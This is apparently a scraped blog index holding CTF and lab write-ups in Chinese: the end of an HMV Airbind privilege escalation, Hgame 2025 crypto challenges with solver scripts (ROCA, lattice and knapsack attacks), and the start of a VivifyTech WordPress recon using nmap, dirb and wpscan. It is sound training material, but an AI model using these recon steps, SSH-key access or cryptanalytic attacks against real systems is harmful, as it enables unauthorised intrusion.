gid=0(root) groups=0(root) cd /root ls user.txt cat user.txt 4408f370877687429c6ab332e6f560d0 ","date":"2025-02-23","objectID":"/vuln_hmv6/:1:3","tags":["渗透"],"title":"HMV Airbind","uri":"/vuln_hmv6/"},{"categories":["靶场"],"content":"提权 本来以为结束了，结果不对劲 ip a看看 ip a 1: lo: \u003cLOOPBACK,UP,LOWER_UP\u003e mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever 2: eth0@if8: \u003cBROADCAST,MULTICAST,UP,LOWER_UP\u003e mtu 1500 qdisc noqueue state UP group default qlen 1000 link/ether dc:a1:f7:82:76:13 brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet 10.0.3.241/24 brd 10.0.3.255 scope global eth0 valid_lft forever preferred_lft forever inet6 fe80::dea1:f7ff:fe82:7613/64 scope link valid_lft forever preferred_lft forever 3: wlan0: \u003cNO-CARRIER,BROADCAST,MULTICAST,UP\u003e mtu 1500 qdisc mq state DOWN group default qlen 1000 link/ether 02:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff 6: ap0: \u003cBROADCAST,MULTICAST\u003e mtu 1500 qdisc noop state DOWN group default qlen 1000 link/ether 42:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff 并不是网页的，应该是docker cd /root ls -a . .. .bash_history .bashrc .lesshst .local .profile .selected_editor .sqlite_history .ssh user.txt .wpa_cli_history cd .ssh ls -a . .. id_rsa id_rsa.pub known_hosts known_hosts.old root下面有ssh，但是上面nmap的时候看见22已经filtered了，ip a有ipv6，可能是ipv6上去？ 使用 ping6 与链路本地地址广播 通过向链路本地地址的 “所有节点多播组” 发送 ICMPv6 请求，可以发现同一链路上的所有 IPv6 设备。 ┌──(kali㉿kali)-[~/Desktop] └─$ ping6 -I eth0 ff02::1 ping6: Warning: source address might be selected on device other than: eth0 PING ff02::1 (ff02::1) from :: eth0: 56 data bytes 64 bytes from fe80::1037:b3ff:febe:6938%eth0: icmp_seq=1 ttl=64 time=0.093 ms 64 bytes from fe80::cec:2f0f:8e21:5edc%eth0: icmp_seq=1 ttl=64 time=0.396 ms 64 bytes from fe80::a00:27ff:fe97:c197%eth0: icmp_seq=1 ttl=64 time=1.66 ms 一个一个连，拿到root.txt，桥连的时候会错，不知道为什么，所以推荐改成nat 2bd693135712f88726c22770278a2dcf ","date":"2025-02-23","objectID":"/vuln_hmv6/:1:4","tags":["渗透"],"title":"HMV Airbind","uri":"/vuln_hmv6/"},{"categories":["CTF"],"content":"week1 ","date":"2025-02-19","objectID":"/hgame2025_crypto/:1:0","tags":["crypto"],"title":"Hgame2025_crypto","uri":"/hgame2025_crypto/"},{"categories":["CTF"],"content":"sieve task from Crypto.Util.number import bytes_to_long from sympy import nextprime FLAG = b'hgame{xxxxxxxxxxxxxxxxxxxxxx}' m = bytes_to_long(FLAG) def trick(k): if k \u003e 1: mul = prod(range(1,k)) if k - mul % k - 1 == 0: return euler_phi(k) + trick(k-1) + 1 else: return euler_phi(k) + trick(k-1) else: return 1 e = 65537 p = q = nextprime(trick(e^2//6)\u003c\u003c128) n = p * q enc = pow(m,e,n) print(f'{enc=}') trick计算的是小于k的所有数的欧拉函数之和加上素数的个数 这个k - mul % k - 1 == 0成立代表此时为素数(威尔逊定理) 实现可以用sage里面的phi，这里都用cpp写了，快一点 #include \u003ciostream\u003e #include \u003cvector\u003e #include \u003ccmath\u003e using namespace std; typedef long long ll; int main() { ll n = 715849728; vector\u003cbool\u003e isPrime(n, true); isPrime[0] = isPrime[1] = false; // 处理2的倍数 for (ll j = 4; j \u003c n; j += 2) { isPrime[j] = false; } // 只处理奇数 for (ll i = 3; i * i \u003c= n; i += 2) { if (isPrime[i]) { for (ll j = i * i; j \u003c n; j += 2 * i) { isPrime[j] = false; } } } ll count = 0; for (ll i = 2; i \u003c n; i++) { if (isPrime[i]) { count++; } } cout \u003c\u003c count \u003c\u003c endl; return 0; } //37030583 #include \u003ccstdio\u003e #include \u003ciostream\u003e #define ll long long using namespace std; const int N = 1e7 + 1; ll phi[N + 10], prime[N + 10]; int tot; bool mark[N + 10]; void getphi(int n) { phi[1] = 1; for (int i = 2; i \u003c= n; i++) { if (!mark[i]) { prime[++tot] = i; phi[i] = i - 1; // 性质1 } for (int j = 1; j \u003c= tot \u0026\u0026 i * prime[j] \u003c= n; j++) { mark[i * prime[j]] = 1; if (!(i % prime[j])) { phi[i * prime[j]] = phi[i] * prime[j]; // 性质2 break; } else phi[i * prime[j]] = phi[i] * (prime[j] - 1); } } for (int i = 2; i \u003c= n; i++) phi[i] += phi[i - 1]; } ll work(int n) { if (n \u003c= N) return phi[n]; ll ans = 0; int pos; for (int i = 2; i \u003c= n; i = pos + 1) { pos = n / (n / i); // 向下取整，很长一段是相同的 ans += (pos - i + 1) * work(n / i); } return (ll)n * (n + 1) / 2 - ans; } int main() { int n = 715849728; getphi(N); printf(\"%lld\", work(n)); return 0; } // 155763335410704472 然后去求解flag from Crypto.Util.number import * from sympy import nextprime e = 65537 trick_result = 155763335410704472+37030583 p = q = nextprime(trick_result\u003c\u003c128) n=p**2 phi=p**2-p enc=2449294097474714136530140099784592732766444481665278038069484466665506153967851063209402336025065476172617376546 d=inverse(e,phi) print(long_to_bytes(int(pow(enc,d,n)))) ","date":"2025-02-19","objectID":"/hgame2025_crypto/:1:1","tags":["crypto"],"title":"Hgame2025_crypto","uri":"/hgame2025_crypto/"},{"categories":["CTF"],"content":"ezbag task from Crypto.Util.number import * import random from Crypto.Cipher import AES import hashlib from Crypto.Util.Padding import pad from secrets import flag list = [] bag = [] p=random.getrandbits(64) assert len(bin(p)[2:])==64 for i in range(4): t = p a=[getPrime(32) for _ in range(64)] b=0 for i in a: temp=t%2 b+=temp*i t=t\u003e\u003e1 list.append(a) bag.append(b) print(f'list={list}') print(f'bag={bag}') key = hashlib.sha256(str(p).encode()).digest() cipher = AES.new(key, AES.MODE_ECB) flag = pad(flag,16) ciphertext = cipher.encrypt(flag) print(f\"ciphertext={ciphertext}\") 本来想着直接用通杀，直接构造试试，发现出不来，估计是密度问题，给两组数据应该也是因为这个，那么就把第二组数据扔最下面新的一行，用BKZ即可 看stone的wp，好像还有更简单的方法，我也写上来 import hashlib from Crypto.Util.number import * from Crypto.Cipher import AES list= bag= ciphertext= L=Matrix(ZZ,65,68) for i in range(64): L[i,i]=2 L[i,-1]=list[0][-i-1] L[i,-2]=list[1][-i-1] L[i,-3]=list[2][-i-1] L[i,-4]=list[3][-i-1] L[-1,:]=1 L[-1,-1]=bag[0] L[-1,-2]=bag[1] L[-1,-3]=bag[2] L[-1,-4]=bag[3] x=L.BKZ() print(x[0]) p='' for i in x[0][:64]: if i==x[0][0]: p+='1' else: p+='0' p=int(p,2) key = hashlib.sha256(str(p).encode()).digest() cipher = AES.new(key, AES.MODE_ECB) flag = cipher.decrypt(ciphertext) print(flag) ''' | | |p0 p1 ...|*|a0 a1 a2 a3| = |b0 b1 ...| | | ''' A= matrix(ZZ,list).T B= matrix(ZZ,bag) M= block_matrix(ZZ,[[1,A],[0,B]]) v = M.BKZ() a = -1*v[-1] p = int(''.join(map(str,a[:-4][::-1])),2) #17739748707559623655 key = hashlib.sha256(str(p).encode()).digest() cipher = AES.new(key, AES.MODE_ECB) cipher.decrypt(ciphertext) ","date":"2025-02-19","objectID":"/hgame2025_crypto/:1:2","tags":["crypto"],"title":"Hgame2025_crypto","uri":"/hgame2025_crypto/"},{"categories":["CTF"],"content":"surperrsa 好像是中间改了一次题？ task from Crypto.Util.number import * import random from sympy import prime FLAG=b'hgame{xxxxxxxxxxxxxxxxxx}' e=0x10001 def primorial(num): result = 1 for i in range(1, num + 1): result *= prime(i) return result M=primorial(random.choice([39,71,126])) def gen_key(): while True: k = getPrime(random.randint(20,40)) a = getPrime(random.randint(20,60)) p = k * M + pow(e, a, M) if isPrime(p): return p p,q=gen_key(),gen_key() n=p*q m=bytes_to_long(FLAG) enc=pow(m,e,n) print(f'{n=}') print(f'{enc=}') 改了之后就是最经典的roca问题啦，直接用脚本，改一下参数就行，微调一下 #roca脚本 from Crypto.Util.number import * ## Coppersmith-howgrave def coppersmith_howgrave(f, N, beta, m, t, R): #Check if parameters are within bounds assert 0 \u003c beta \u003c= 1, 'beta not in (0, 1]' assert f.is_monic(), 'f is not monic' #get delta and the matrix dimension delta = f.degree() n = delta * m + t #Building the polynomials fZ = f.change_ring(ZZ) #change the ring from Zmod(N) to ZZ x = fZ.parent().gen() #make x a variable in ZZ f_list = [] for ii in range(m): for j in range(delta): #We want them ordered that's we have N^(m-ii1) and fZ^ii f_list.append(((x*R)^j) * N^(m-ii) * fZ(x*R)^(ii)) #the g_{i,j} for ii in range(t): f_list.append((x*R)^ii * fZ(x*R)^m) #the h_i #Build the lattice B = matrix(ZZ, n) # n = delta * m + t for ii in range(n): for j in range(ii+1): B[ii, j] = f_list[ii][j] #LLL it B_lll = B.LLL(early_red = True, use_siegel = True) #take the shortest vector to construct our new poly g g = 0 for ii in range(n): g += x^ii * B_lll[0, ii] / R^ii #factor the polynomial potential_roots = g.roots() #print('potential roots:', potential_roots) #we don't need to do this Since our we test in our roca function # #test roots # roots = [] # for r in potential_roots: # if r[0].is_integer(): # res = fZ(ZZ(r[0])) # if gcd(N, res) \u003e= N^beta: # roots.append(ZZ(r[0])) #print('roots:', roots) return potential_roots #return roots def roca(N, M_prime, g, m, t, beta): g = int(g) c_prime = discrete_log(Zmod(M_prime)(N), Zmod(M_prime)(g)) ord_M_prime = Zmod(M_prime)(g).multiplicative_order() #search boundaries bottom = c_prime // 2 top =(c_prime + ord_M_prime) // 2 print('numbers to check', top - bottom, ' between ', (bottom, top)) #constants for coppersmith P.\u003cx\u003e = PolynomialRing(Zmod(N)) epsilon = beta / 7 X = floor(2 * N^beta / M_prime) #the search for i, a in enumerate(range(bottom, top)): if i % 1000 == 0: #count iterations print(i) #construct polynomial f = x + int((inverse_mod(M_prime, N)) * int(pow(g, a, M_prime))) #roots = f.small_roots(X, beta, epsilon) #coppersmith roots = coppersmith_howgrave(f, N, beta, m, t, X) #check solutions for k_prime, _ in roots: p = int(k_prime * M_prime) + int(pow(g, a, M_prime)) if N % p == 0: return p, N//p return -1, -1 n=787190064146025392337631797277972559696758830083248285626115725258876808514690830730702705056550628756290183000265129340257928314614351263713241 e=65537 def get_M1_m_t_values(key_size): if 512 \u003c= key_size \u003c 1024: m = 5 M1=0x1b3e6c9433a7735fa5fc479ffe4027e13bea elif 1024 \u003c= key_size \u003c 2048: m = 4 M1=0x24683144f41188c2b1d6a217f81f12888e4e6513c43f3f60e72af8bd9728807483425d1e elif 2048 \u003c= key_size \u003c 3072: m = 6 M1=0x016928dc3e47b44daf289a60e80e1fc6bd7648d7ef60d1890f3e0a9455efe0abdb7a748131413cebd2e36a76a355c1b664be462e115ac330f9c13344f8f3d1034a02c23396e6 elif 3072 \u003c= key_size \u003c 4096: m = 25 else: m = 7 return M1,m, m+1 M_prime,m, t = get_M1_m_t_values(512) p, q = roca(n, M_prime, e, m, t, .5) assert(p*q==n) print(p) print(q) enc=365164788284364079752299551355267634718233656769290285760796137651769990253028664857272749598268110892426683253579840758552222893644373690398408 print(long_to_bytes(int(pow(enc,inverse_mod(e,(p-1)*(q-1)),n)))) ","date":"2025-02-19","objectID":"/hgame2025_crypto/:1:3","tags":["crypto"],"title":"Hgame2025_crypto","uri":"/hgame2025_crypto/"},{"categories":["CTF"],"content":"week2 ","date":"2025-02-19","objectID":"/hgame2025_crypto/:2:0","tags":["crypto"],"title":"Hgame2025_crypto","uri":"/hgame2025_crypto/"},{"categories":["CTF"],"content":"Ancient Recall task import random Major_Arcana = [\"The Fool\", \"The Magician\", \"The High Priestess\",\"The Empress\", \"The Emperor\", \"The Hierophant\",\"The Lovers\", \"The Chariot\", \"Strength\",\"The Hermit\", \"Wheel of Fortune\", \"Justice\",\"The Hanged Man\", \"Death\", \"Temperance\",\"The Devil\", \"The Tower\", \"The Star\",\"The Moon\", \"The Sun\", \"Judgement\",\"The World\"] wands = [\"Ace of Wands\", \"Two of Wands\", \"Three of Wands\", \"Four of Wands\", \"Five of Wands\", \"Six of Wands\", \"Seven of Wands\", \"Eight of Wands\", \"Nine of Wands\", \"Ten of Wands\", \"Page of Wands\", \"Knight of Wands\", \"Queen of Wands\", \"King of Wands\"] cups = [\"Ace of Cups\", \"Two of Cups\", \"Three of Cups\", \"Four of Cups\", \"Five of Cups\", \"Six of Cups\", \"Seven of Cups\", \"Eight of Cups\", \"Nine of Cups\", \"Ten of Cups\", \"Page of Cups\", \"Knight of Cups\", \"Queen of Cups\", \"King of Cups\"] swords = [\"Ace of Swords\", \"Two of Swords\", \"Three of Swords\", \"Four of Swords\", \"Five of Swords\", \"Six of Swords\", \"Seven of Swords\", \"Eight of Swords\", \"Nine of Swords\", \"Ten of Swords\", \"Page of Swords\", \"Knight of Swords\", \"Queen of Swords\", \"King of Swords\"] pentacles = [\"Ace of Pentacles\", \"Two of Pentacles\", \"Three of Pentacles\", \"Four of Pentacles\", \"Five of Pentacles\", \"Six of Pentacles\", \"Seven of Pentacles\", \"Eight of Pentacles\", \"Nine of Pentacles\", \"Ten of Pentacles\", \"Page of Pentacles\", \"Knight of Pentacles\", \"Queen of Pentacles\", \"King of Pentacles\"] Minor_Arcana = wands + cups + swords + pentacles tarot = Major_Arcana + Minor_Arcana reversals = [0,-1] Value = [] cards = [] YOUR_initial_FATE = [] while len(YOUR_initial_FATE)\u003c5: card = random.choice(tarot) if card not in cards: cards.append(card) if card in Major_Arcana: k = random.choice(reversals) Value.append(tarot.index(card)^k) if k == -1: YOUR_initial_FATE.append(\"re-\"+card) else: YOUR_initial_FATE.append(card) else: Value.append(tarot.index(card)) YOUR_initial_FATE.append(card) else: continue print(\"Oops!lets reverse 1T!\") FLAG=(\"hgame{\"+\"\u0026\".join(YOUR_initial_FATE)+\"}\").replace(\" \",\"_\") YOUR_final_Value = Value def Fortune_wheel(FATE): FATEd = [FATE[i]+FATE[(i+1)%5] for i in range(len(FATE))] return FATEd for i in range(250): YOUR_final_Value = Fortune_wheel(YOUR_final_Value) print(YOUR_final_Value) YOUR_final_FATE = [] for i in YOUR_final_Value: YOUR_final_FATE.append(tarot[i%78]) print(\"Your destiny changed!\\n\",\",\".join(YOUR_final_FATE)) print(\"oh,now you GET th3 GOOd lU\u003ek,^^\") \"\"\" Oops!lets reverse 1T! [2532951952066291774890498369114195917240794704918210520571067085311474675019, 2532951952066291774890327666074100357898023013105443178881294700381509795270, 2532951952066291774890554459287276604903130315859258544173068376967072335730, 2532951952066291774890865328241532885391510162611534514014409174284299139015, 2532951952066291774890830662608134156017946376309989934175833913921142609334] Your destiny changed! Eight of Cups,Ace of Cups,Strength,The Chariot,Five of Swords oh,now you GET th3 GOOd lU\u003ek,^^ \"\"\" 感觉是纯纯的脚本题,上一个是abcde，下一个就是a+b,b+c,c+d,d+e,e+a，那么e+a-a-b+b+c-c-d+d+e=2e，一个一个还原就行了 Major_Arcana = [\"The Fool\", \"The Magician\", \"The High Priestess\", \"The Empress\", \"The Emperor\", \"The Hierophant\", \"The Lovers\", \"The Chariot\", \"Strength\", \"The Hermit\", \"Wheel of Fortune\", \"Justice\", \"The Hanged Man\", \"Death\", \"Temperance\", \"The Devil\", \"The Tower\", \"The Star\", \"The Moon\", \"The Sun\", \"Judgement\", \"The World\"] Minor_Arcana = [\"Ace of Wands\", \"Two of Wands\", \"Three of Wands\", \"Four of Wands\", \"Five of Wands\", \"Six of Wands\", \"Seven of Wands\", \"Eight of Wands\", \"Nine of Wands\", \"Ten of Wands\", \"Page of Wands\", \"Knight of Wands\", \"Queen of Wands\", \"King of Wands\", \"Ace of Cups\", \"Two of Cups\", \"Three of Cups\", \"Four of Cups\", \"Five of Cups\", \"Six of Cups\", \"Seven of Cups\", \"Eight of Cups\", \"Nine of Cups\", \"Ten of Cups\", \"Page of Cups\", \"Knight of Cups\", \"Queen of Cups\", \"King of Cups\", \"Ace of Swords\", \"Two of Swords\", \"Three of Swords\", \"Four of Swords\", \"Five of Swords\", \"Six of Swords\", \"Seven of Swords\", \"Eight of Swords\", \"Nine of Swor","date":"2025-02-19","objectID":"/hgame2025_crypto/:2:1","tags":["crypto"],"title":"Hgame2025_crypto","uri":"/hgame2025_crypto/"},{"categories":["CTF"],"content":"Intergalactic Bound task from Crypto.Util.number import * from Crypto.Cipher import AES from Crypto.Util.Padding import pad from random import randint import hashlib from secrets import flag def add_THCurve(P, Q): if P == (0, 0): return Q if Q == (0, 0): return P x1, y1 = P x2, y2 = Q x3 = (x1 - y1 ** 2 * x2 * y2) * pow(a * x1 * y1 * x2 ** 2 - y2, -1, p) % p y3 = (y1 * y2 ** 2 - a * x1 ** 2 * x2) * pow(a * x1 * y1 * x2 ** 2 - y2, -1, p) % p return x3, y3 def mul_THCurve(n, P): R = (0, 0) while n \u003e 0: if n % 2 == 1: R = add_THCurve(R, P) P = add_THCurve(P, P) n = n // 2 return R p = getPrime(96) a = randint(1, p) G = (randint(1,p), randint(1,p)) d = (a*G[0]^3+G[1]^3+1)%p*inverse(G[0]*G[1],p)%p x = randint(1, p) Q = mul_THCurve(x, G) print(f\"p = {p}\") print(f\"G = {G}\") print(f\"Q = {Q}\") key = hashlib.sha256(str(x).encode()).digest() cipher = AES.new(key, AES.MODE_ECB) flag = pad(flag,16) ciphertext = cipher.encrypt(flag) print(f\"ciphertext={ciphertext}\") \"\"\" p = 55099055368053948610276786301 G = (19663446762962927633037926740, 35074412430915656071777015320) Q = (26805137673536635825884330180, 26376833112609309475951186883) ciphertext=b\"k\\xe8\\xbe\\x94\\x9e\\xfc\\xe2\\x9e\\x97\\xe5\\xf3\\x04'\\x8f\\xb2\\x01T\\x06\\x88\\x04\\xeb3Jl\\xdd Pk$\\x00:\\xf5\" \"\"\" 先把a求出来，后面类似羊城杯, https://tangcuxiaojikuai.xyz/post/689431.html p = 55099055368053948610276786301 Gx, Gy = 19663446762962927633037926740, 35074412430915656071777015320 Qx, Qy = 26805137673536635825884330180, 26376833112609309475951186883 G = (19663446762962927633037926740, 35074412430915656071777015320) Q = (26805137673536635825884330180, 26376833112609309475951186883) ciphertext=b\"k\\xe8\\xbe\\x94\\x9e\\xfc\\xe2\\x9e\\x97\\xe5\\xf3\\x04'\\x8f\\xb2\\x01T\\x06\\x88\\x04\\xeb3Jl\\xdd Pk$\\x00:\\xf5\" from Crypto.Util.number import* numerator = ((pow(Qy,3,p)+1)*Gx*Gy - (pow(Gy,3,p)+1)*Qx*Qy) % p denominator = (pow(Gx,3,p)*Qx*Qy - pow(Qx,3,p)*Gx*Gy) % p a = (numerator * pow(denominator, -1, p)) % p print(a) a=39081810733380615260725035189 d = (a*G[0]^3+G[1]^3+1)%p*inverse(G[0]*G[1],p)%p R.\u003cx,y,z\u003e = Zmod(p)[] cubic = a*x^3 + y^3 + z^3 - d*x*y*z E = EllipticCurve_from_cubic(cubic,morphism=True) P = E(G) Q = E(Q) r = 60869967041981 m = (r*Q).log(r*P) from Crypto.Cipher import AES import hashlib key = hashlib.sha256(str(m).encode()).digest() cipher = AES.new(key, AES.MODE_ECB) ciphertext = b\"k\\xe8\\xbe\\x94\\x9e\\xfc\\xe2\\x9e\\x97\\xe5\\xf3\\x04'\\x8f\\xb2\\x01T\\x06\\x88\\x04\\xeb3Jl\\xdd Pk$\\x00:\\xf5\" flag = cipher.decrypt(ciphertext) print(\"Flag:\", flag) ","date":"2025-02-19","objectID":"/hgame2025_crypto/:2:2","tags":["crypto"],"title":"Hgame2025_crypto","uri":"/hgame2025_crypto/"},{"categories":["CTF"],"content":"SPiCa task from Crypto.Util.number import getPrime, long_to_bytes,bytes_to_long from secrets import flag from sage.all import * def derive_M(n): iota=0.035 Mbits=int(2 * iota * n^2 + n * log(n,2)) M = random_prime(2^Mbits, proof = False, lbound = 2^(Mbits - 1)) return Integer(M) m = bytes_to_long(flag).bit_length() n = 70 p = derive_M(n) F = GF(p) x = random_matrix(F, 1, n) A = random_matrix(ZZ, n, m, x=0, y=2) A[randint(0, n-1)] = vector(ZZ, list(bin(bytes_to_long(flag))[2:])) h = x*A with open(\"data.txt\", \"w\") as file: file.write(str(m) + \"\\n\") file.write(str(p) + \"\\n\") for item in h: file.write(str(item) + \"\\n\") 是一个hssp问题，用的https://0xffff.one/d/2077/6 ,没咋理解，但是会写题啦起码（） from Crypto.Util.number import * import logging logging.basicConfig( level=logging.DEBUG, format=\"[%(levelname)s] %(message)s\" ) # https://github.com/Neobeo/HackTM2023/blob/main/solve420.sage # faster LLL reduction to replace `M.LLL()` wiith `flatter(M)` def flatter(M, **kwds): from subprocess import check_output from re import findall M = matrix(ZZ,M) # compile https://github.com/keeganryan/flatter and put it in [imath:0]PATH z = '[[' + ']\\n['.join(' '.join(map(str,row)) for row in M) + ']]' ret = check_output([\"flatter\"], input=z.encode()) return matrix(M.nrows(), M.ncols(), map(int,findall(b'-?\\\\d+', ret))) def checkMatrix(M, wl=[-1, 1]): M = [list(_) for _ in list(M)] ml = list(set(flatten(M))) logging.debug(ml) return sorted(ml) == sorted(wl) def Nguyen_Stern(h, m, n, M): B = matrix(ZZ, m) B[0, 0] = M h0i = Integer(h[0]).inverse_mod(M) for i in range(1, m): B[i, 0] = - h[i] * h0i B[i, i] = 1 #L = B.BKZ() # slooooooow L = flatter(B) logging.info('flatter done.') ''' vh = vector(Zmod(M), h) logging.debug([vector(Zmod(M), list(l)) * vh for l in L]) ''' Lxo = matrix(ZZ, L[:m-n]) Lxc = Lxo.right_kernel(algorithm='pari').matrix() # faster logging.info('right_kernel done.') ''' try: Lx_real = matrix(ZZ, [xi + [0] * (m - len(xi)) for xi in X]) rsc = Lxc.row_space() logging.debug([xi in rsc for xi in Lx_real]) except: pass ''' e = matrix(ZZ, [1] * m) B = block_matrix([[-e], [2*Lxc]]) Lx = B.BKZ() logging.info('BKZ done.') assert checkMatrix(Lx) assert len(set(Lx[0])) == 1 Lx = Lx[1:] E = matrix(ZZ, [[1 for c in range(Lxc.ncols())] for r in range(Lxc.nrows())]) Lx = (Lx + E) / 2 Lx2 = [] e = vector(ZZ, [1] * m) rsc = Lxc.row_space() for lx in Lx: if lx in rsc: Lx2 += [lx] continue lx = e - lx if lx in rsc: Lx2 += [lx] continue logging.warning('Something wrong?') Lx = matrix(Zmod(M), Lx2) vh = vector(Zmod(M), h) va = Lx.solve_left(vh) return Lx, va m=247 n=70 M= h= Lx, va = Nguyen_Stern(h, m, n, M) for i in Lx: flag='' for j in i: flag+=str(j) flag=long_to_bytes(int(flag,2)) if b'hgame' in flag: print(flag) ","date":"2025-02-19","objectID":"/hgame2025_crypto/:2:3","tags":["crypto"],"title":"Hgame2025_crypto","uri":"/hgame2025_crypto/"},{"categories":["CTF"],"content":"总结 题目质量真的挺高的，有些题第一开始不会写，想了好多才发现自己是zz，被自己蠢哭了 ","date":"2025-02-19","objectID":"/hgame2025_crypto/:3:0","tags":["crypto"],"title":"Hgame2025_crypto","uri":"/hgame2025_crypto/"},{"categories":["靶场"],"content":"VivifyTech ","date":"2025-02-18","objectID":"/vuln_hmv5/:1:0","tags":["渗透"],"title":"HMV VivifyTech","uri":"/vuln_hmv5/"},{"categories":["靶场"],"content":"靶场链接 https://hackmyvm.eu/machines/machine.php?vm=VivifyTech ","date":"2025-02-18","objectID":"/vuln_hmv5/:1:1","tags":["渗透"],"title":"HMV VivifyTech","uri":"/vuln_hmv5/"},{"categories":["靶场"],"content":"日常扫描 ┌──(kali㉿kali)-[~] └─$ sudo arp-scan -l Interface: eth0, type: EN10MB, MAC: 12:37:b3:be:69:38, IPv4: 192.168.64.3 WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan) 192.168.64.1 16:7f:ce:9b:a1:64 (Unknown: locally administered) 192.168.64.23 de:be:f3:07:14:ee (Unknown: locally administered) 2 packets received by filter, 0 packets dropped by kernel Ending arp-scan 1.10.0: 256 hosts scanned in 1.867 seconds (137.12 hosts/sec). 2 responded ┌──(kali㉿kali)-[~] └─$ nmap -sV -sC -T4 -Pn -p- 192.168.64.23 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-17 11:32 HKT Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan Service scan Timing: About 50.00% done; ETC: 11:32 (0:00:03 remaining) Nmap scan report for 192.168.64.23 Host is up (0.00098s latency). Not shown: 65531 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0) | ssh-hostkey: | 256 32:f3:f6:36:95:12:c8:18:f3:ad:b8:0f:04:4d:73:2f (ECDSA) |_ 256 1d:ec:9c:6e:3c:cf:83:f6:f0:45:22:58:13:2f:d3:9e (ED25519) 80/tcp open http Apache httpd 2.4.57 ((Debian)) |_http-server-header: Apache/2.4.57 (Debian) |_http-title: Apache2 Debian Default Page: It works 3306/tcp open mysql MySQL (unauthorized) 33060/tcp open mysqlx? | fingerprint-strings: | DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: | Invalid message\" | HY000 | LDAPBindReq: | *Parse error unserializing protobuf message\" | HY000 | oracle-tns: | Invalid message-frame.\" |_ HY000 扫一下 ┌──(kali㉿kali)-[~] └─$ dirb http://192.168.64.23 ----------------- DIRB v2.22 By The Dark Raver ----------------- START_TIME: Mon Feb 17 11:52:06 2025 URL_BASE: http://192.168.64.23/ WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt ----------------- GENERATED WORDS: 4612 ---- Scanning URL: http://192.168.64.23/ ---- + http://192.168.64.23/index.html (CODE:200|SIZE:10701) + http://192.168.64.23/server-status (CODE:403|SIZE:278) ==\u003e DIRECTORY: http://192.168.64.23/wordpress/ ---- Entering directory: http://192.168.64.23/wordpress/ ---- + http://192.168.64.23/wordpress/index.php (CODE:301|SIZE:0) ==\u003e DIRECTORY: http://192.168.64.23/wordpress/wp-admin/ ==\u003e DIRECTORY: http://192.168.64.23/wordpress/wp-content/ ==\u003e DIRECTORY: http://192.168.64.23/wordpress/wp-includes/ + http://192.168.64.23/wordpress/xmlrpc.php (CODE:405|SIZE:42) ---- Entering directory: http://192.168.64.23/wordpress/wp-admin/ ---- + http://192.168.64.23/wordpress/wp-admin/admin.php (CODE:302|SIZE:0) ==\u003e DIRECTORY: http://192.168.64.23/wordpress/wp-admin/css/ ==\u003e DIRECTORY: http://192.168.64.23/wordpress/wp-admin/images/ ==\u003e DIRECTORY: http://192.168.64.23/wordpress/wp-admin/includes/ + http://192.168.64.23/wordpress/wp-admin/index.php (CODE:302|SIZE:0) ==\u003e DIRECTORY: http://192.168.64.23/wordpress/wp-admin/js/ ==\u003e DIRECTORY: http://192.168.64.23/wordpress/wp-admin/maint/ ==\u003e DIRECTORY: http://192.168.64.23/wordpress/wp-admin/network/ ==\u003e DIRECTORY: http://192.168.64.23/wordpress/wp-admin/user/ ---- Entering directory: http://192.168.64.23/wordpress/wp-content/ ---- + http://192.168.64.23/wordpress/wp-content/index.php (CODE:200|SIZE:0) ==\u003e DIRECTORY: http://192.168.64.23/wordpress/wp-content/plugins/ ==\u003e DIRECTORY: http://192.168.64.23/wordpress/wp-content/themes/ ==\u003e DIRECTORY: http://192.168.64.23/wordpress/wp-content/upgrade/ ==\u003e DIRECTORY: http://192.168.64.23/wordpress/wp-content/uploads/ ---- Entering directory: http://192.168.64.23/wordpress/wp-includes/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode '-w' if you want to scan it anyway) ---- Entering directory: http://192.168.64.23/wordpress/wp-admin/css/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode '-w' if you want to scan it anyway) ---- Entering directory: http://192.168.64.23/wor","date":"2025-02-18","objectID":"/vuln_hmv5/:1:2","tags":["渗透"],"title":"HMV VivifyTech","uri":"/vuln_hmv5/"},{"categories":["靶场"],"content":"反弹shell 有wp网站，wpscan扫一下 ┌──(kali㉿kali)-[~] └─$ wpscan --url http://192.168.64.23/wordpress --api-token=* -e u _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | '_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.27 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [+] URL: http://192.168.64.23/wordpress/ [192.168.64.23] [+] Started: Mon Feb 17 13:00:58 2025 Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.57 (Debian) | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://192.168.64.23/wordpress/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://192.168.64.23/wordpress/readme.html | Found 